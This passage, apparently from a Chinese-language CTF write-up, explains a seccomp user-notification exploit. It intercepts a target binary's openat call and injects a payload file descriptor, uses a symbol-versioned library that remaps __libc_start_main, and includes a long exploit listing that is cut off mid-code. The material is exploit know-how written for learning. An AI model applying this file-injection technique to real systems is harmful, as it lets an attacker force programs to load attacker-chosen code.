<li>fork出子进程, 一通prctl+install seccomp unotifier之后通过socket发送notifyfd到父进程, 再执行<code>/home/pwn/readme</code>.<br>其中install的规则主要是为openat装载unotify. </li>
<li>(然后都是unotify supervisor的基本流程)</li>
<li>通过socket接受unotify fd. (这个流程也很长, 使用了recvmsg等一系列奇怪函数, 不管了.)</li>
<li>通过ioctl来轮询fd, 当readme openat的时候会被打断, 此时由父进程打开payload文件, 然后通过seccomp_notif_addfd来复制fd到子进程的fd列表之中, 由ioctl返回在子进程中最终打开的fd number, 最后response, 设置openat syscall的返回值为该fd number. </li>
<li>上面的流程是一个死循环, 由child exit到signal handler终止所有进程.  </li>
</ul>
<h4 id="关键点"><a href="#关键点" class="headerlink" title="关键点:"></a>关键点:</h4><ul>
<li>UNIX domain socket or IPC socket</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br>sockfd = socket(<span class="hljs-keyword">int</span> socket_family, <span class="hljs-keyword">int</span> socket_type, <span class="hljs-keyword">int</span> protocol);<br></code></pre></div></td></tr></table></figure>

<p>其中socket_family=AF_UNIX, socket_type有三种(TCP UDP SCTP?)</p>
<p>send是fd和recvfd函数都是使用sendmsg来…..看不懂, 一堆宏定义, 反正知道他能通过socket fd来传递fd就行了. </p>
<ul>
<li>seccomp unotify:<code>seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, &amp;prog);</code> </li>
</ul>
<p>因为glibc没有对seccomp wrap, 所以实际上是:</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">seccomp</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> operation, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">void</span> *args)</span></span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_seccomp, operation, flags, args); &#125;<br></code></pre></div></td></tr></table></figure>

<p>第一个<code>SECCOMP_SET_MODE_FILTER</code>就是指把arg当成BPF指针来定义一个filter. 这个filter在fork clone execve的时候保留下来. <strong>前提</strong>是调用的线程必须在它的namespace里有CAP_SYS_ADMIN, 或者已经设置了no_new_privs位. </p>
<p>一般都关注后者, 也就是通过<code>prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)</code>设置. 这个process control函数配上这些参数能够限制execve执行setuid的程序, 否则通过execve执行setuid程序后装载一个不执行<code>setuid()</code>且返回0的filter时, 这样的程序会在没有真正drop privileges的情况下继续运行malicious commands. </p>
<p>而第二个参数flags要使用<code>SECCOMP_FILTER_FLAG_NEW_LISTENER</code>, 这样成功安装filter后，返回一个新的user-space notification file。(为文件描述符设置了“close-on-exec” flag。)当filter返回SECCOMP_RET_USER_NOTIF时，将向该fd发送通知。每线程最多只能装载一个带有这个flag的filter.</p>
<ul>
<li><code>SECCOMP_IOCTL_NOTIF_ADDFD</code> </li>
</ul>
<p>The SECCOMP_IOCTL_NOTIF_ADDFD operation (available since Linux5.9) allows the supervisor to <strong>install a file descriptor</strong> into the target’s file descriptor table. </p>
<ul>
<li><a target="_blank" rel="noopener" href="http://web.mit.edu/rhel-doc/3/rhel-as-en-3/symver.html"><code>.symver</code></a> directive and <a target="_blank" rel="noopener" href="https://gcc.gnu.org/wiki/SymbolVersioning">SymbolVersioning</a> | <a target="_blank" rel="noopener" href="https://sourceware.org/binutils/docs/ld/VERSION.html"><em>linker script</em> VERSION command</a> </li>
</ul>
<p>总之就是将symbol绑定到version node上, 一个symbol可以有多个version node, 最关键的是map file.</p>
<p>同时可以在库的源代码中添加绑定信息, 这样可以减少shared library maintainer的工作, 不过此时mapfile必须包括所有的version node, 也就是这个asm trick只是mapfile的补充. </p>
<p>经过测试, solution中的payload.c可以大幅度缩减, payload.map也可以删去2.34的定义:</p>
<ul>
<li>puts完全没必要, 只要<code>__libc_start_main</code>被修改为write函数之后就已经达成目的. </li>
<li>源码中使用asm把<code>__libc_start_main_impl</code>当做<code>__libc_start_main</code>的alias,<br>不过也可以直接不要impl, 直接<code>__libc_start_main</code>就行了</li>
<li>头文件也没必要. 2.2.5也没必要. 为什么是这个版本号我也不知道. </li>
<li>过了一个月再试发现payload.map里2.2.5和2.34都不能删去, 否则libc会报version not found. 原因未知.</li>
</ul>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;limits.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/audit.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/filter.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/un.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> errExit(msg)    \</span><br><span class="hljs-meta">  do                    \</span><br><span class="hljs-meta">  &#123;                     \</span><br><span class="hljs-meta">    perror(msg);        \</span><br><span class="hljs-meta">    exit(EXIT_FAILURE); \</span><br><span class="hljs-meta">  &#125; while (0)</span><br><br><span class="hljs-comment">/* Send the file descriptor &#x27;fd&#x27; over the connected UNIX domain socket</span><br><span class="hljs-comment">  &#x27;sockfd&#x27;. Returns 0 on success, or -1 on error. */</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sendfd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockfd, <span class="hljs-keyword">int</span> fd)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msgh</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>;</span><br>  <span class="hljs-keyword">int</span> data;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmsgp</span>;</span><br><br>  <span class="hljs-comment">/* Allocate a char array of suitable size to hold the ancillary data.</span><br><span class="hljs-comment">     However, since this buffer is in reality a &#x27;struct cmsghdr&#x27;, use a</span><br><span class="hljs-comment">     union to ensure that it is suitably aligned. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-keyword">char</span> buf[CMSG_SPACE(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>))];<br>    <span class="hljs-comment">/* Space large enough to hold an &#x27;int&#x27; */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> <span class="hljs-title">align</span>;</span><br>  &#125; controlMsg;<br><br>  <span class="hljs-comment">/* The &#x27;msg_name&#x27; field can be used to specify the address of the</span><br><span class="hljs-comment">     destination socket when sending a datagram. However, we do not</span><br><span class="hljs-comment">     need to use this field because &#x27;sockfd&#x27; is a connected socket. */</span><br><br>  msgh.msg_name = <span class="hljs-literal">NULL</span>;<br>  msgh.msg_namelen = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* On Linux, we must transmit at least one byte of real data in</span><br><span class="hljs-comment">     order to send ancillary data. We transmit an arbitrary integer</span><br><span class="hljs-comment">     whose value is ignored by recvfd(). */</span><br><br>  msgh.msg_iov = &amp;iov;<br>  msgh.msg_iovlen = <span class="hljs-number">1</span>;<br>  iov.iov_base = &amp;data;<br>  iov.iov_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>);<br>  data = <span class="hljs-number">12345</span>;<br><br>  <span class="hljs-comment">/* Set &#x27;msghdr&#x27; fields that describe ancillary data */</span><br><br>  msgh.msg_control = controlMsg.buf;<br>  msgh.msg_controllen = <span class="hljs-keyword">sizeof</span>(controlMsg.buf);<br><br>  <span class="hljs-comment">/* Set up ancillary data describing file descriptor to send */</span><br><br>  cmsgp = CMSG_FIRSTHDR(&amp;msgh);<br>  cmsgp-&gt;cmsg_level = SOL_SOCKET;<br>  cmsgp-&gt;cmsg_type = SCM_RIGHTS;<br>  cmsgp-&gt;cmsg_len = CMSG_LEN(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>  <span class="hljs-built_in">memcpy</span>(CMSG_DATA(cmsgp), &amp;fd, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br><br>  <span class="hljs-comment">/* Send real plus ancillary data */</span><br><br>  <span class="hljs-keyword">if</span> (sendmsg(sockfd, &amp;msgh, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* Receive a file descriptor on a connected UNIX domain socket. Returns</span><br><span class="hljs-comment">  the received file descriptor on success, or -1 on error. */</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">recvfd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockfd)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msgh</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>;</span><br>  <span class="hljs-keyword">int</span> data, fd;<br>  <span class="hljs-keyword">ssize_t</span> nr;<br><br>  <span class="hljs-comment">/* Allocate a char buffer for the ancillary data. See the comments</span><br><span class="hljs-comment">     in sendfd() */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-keyword">char</span> buf[CMSG_SPACE(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>))];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> <span class="hljs-title">align</span>;</span><br>  &#125; controlMsg;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmsgp</span>;</span><br><br>  <span class="hljs-comment">/* The &#x27;msg_name&#x27; field can be used to obtain the address of the</span><br><span class="hljs-comment">     sending socket. However, we do not need this information. */</span><br><br>  msgh.msg_name = <span class="hljs-literal">NULL</span>;<br>  msgh.msg_namelen = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* Specify buffer for receiving real data */</span><br><br>  msgh.msg_iov = &amp;iov;<br>  msgh.msg_iovlen = <span class="hljs-number">1</span>;<br>  iov.iov_base = &amp;data; <span class="hljs-comment">/* Real data is an &#x27;int&#x27; */</span><br>  iov.iov_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>);<br><br>  <span class="hljs-comment">/* Set &#x27;msghdr&#x27; fields that describe ancillary data */</span><br><br>  msgh.msg_control = controlMsg.buf;<br>  msgh.msg_controllen = <span class="hljs-keyword">sizeof</span>(controlMsg.buf);<br><br>  <span class="hljs-comment">/* Receive real plus ancillary data; real data is ignored */</span><br><br>  nr = recvmsg(sockfd, &amp;msgh, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (nr == <span class="hljs-number">-1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  cmsgp = CMSG_FIRSTHDR(&amp;msgh);<br><br>  <span class="hljs-comment">/* Check the validity of the &#x27;cmsghdr&#x27; */</span><br><br>  <span class="hljs-keyword">if</span> (cmsgp == <span class="hljs-literal">NULL</span> || cmsgp-&gt;cmsg_len != CMSG_LEN(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)) ||<br>      cmsgp-&gt;cmsg_level != SOL_SOCKET || cmsgp-&gt;cmsg_type != SCM_RIGHTS)<br>  &#123;<br>    errno = EINVAL;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br><br>  <span class="hljs-comment">/* Return the received file descriptor to our caller */</span><br><br>  <span class="hljs-built_in">memcpy</span>(&amp;fd, CMSG_DATA(cmsgp), <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>  <span class="hljs-keyword">return</span> fd;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sigchldHandler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// char msg[] = &quot;\tS: target has terminated; bye\n&quot;;</span><br><br>  <span class="hljs-comment">// write(STDOUT_FILENO, msg, sizeof(msg) - 1);</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Child exited&quot;</span>);<br>  _exit(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">seccomp</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> operation, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">void</span> *args)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_seccomp, operation, flags, args);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> X32_SYSCALL_BIT 0x40000001</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> X86_64_CHECK_ARCH_AND_LOAD_SYSCALL_NR                                  \</span><br><span class="hljs-meta">  BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, arch))),   \</span><br><span class="hljs-meta">      BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 0, 2),            \</span><br><span class="hljs-meta">      BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))), \</span><br><span class="hljs-meta">      BPF_JUMP(BPF_JMP | BPF_JGE | BPF_K, X32_SYSCALL_BIT, 0, 1),              \</span><br><span class="hljs-meta">      BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS)</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">installNotifyFilter</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[] =</span> &#123;<br>      X86_64_CHECK_ARCH_AND_LOAD_SYSCALL_NR,<br><br>      BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_USER_NOTIF),<br><br>      BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),<br>  &#125;;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> <span class="hljs-title">prog</span> =</span> &#123;<br>      .len = <span class="hljs-keyword">sizeof</span>(filter) / <span class="hljs-keyword">sizeof</span>(filter[<span class="hljs-number">0</span>]),<br>      .filter = filter,<br>  &#125;;<br><br>  <span class="hljs-keyword">int</span> notifyFd =<br>      seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, &amp;prog);<br>  <span class="hljs-keyword">if</span> (notifyFd == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;seccomp-install-notify-filter&quot;</span>);<br><br>  <span class="hljs-keyword">return</span> notifyFd;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">closeSocketPair</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockPair[<span class="hljs-number">2</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (close(sockPair[<span class="hljs-number">0</span>]) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;closeSocketPair-close-0&quot;</span>);<br>  <span class="hljs-keyword">if</span> (close(sockPair[<span class="hljs-number">1</span>]) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;closeSocketPair-close-1&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">pid_t</span> <span class="hljs-title">targetProcess</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockPair[<span class="hljs-number">2</span>], <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">pid_t</span> targetPid = fork();<br>  <span class="hljs-keyword">if</span> (targetPid == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;fork&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (targetPid &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">/* In parent, return PID of child */</span><br>    <span class="hljs-keyword">return</span> targetPid;<br><br>  <span class="hljs-keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>    errExit(<span class="hljs-string">&quot;prctl&quot;</span>);<br><br>  <span class="hljs-keyword">int</span> notifyFd = installNotifyFilter();<br><br>  <span class="hljs-keyword">if</span> (sendfd(sockPair[<span class="hljs-number">0</span>], notifyFd) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;sendfd&quot;</span>);<br><br>  <span class="hljs-comment">/* Notification and socket FDs are no longer needed in target */</span><br><br>  <span class="hljs-keyword">if</span> (close(notifyFd) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;close-target-notify-fd&quot;</span>);<br><br>  closeSocketPair(sockPair);<br><br>  <span class="hljs-comment">/* Perform a mkdir() call for each of the command-line arguments */</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Executing child&quot;</span>);<br>  sleep(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">char</span> *f = <span class="hljs-literal">NULL</span>;<br>  execve(<span class="hljs-string">&quot;/home/pwn/readme&quot;</span>, &amp;f, &amp;f);<br>  <span class="hljs-comment">// openat(AT_FDCWD,&quot;/bin/bash&quot;,0);</span><br>  <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> 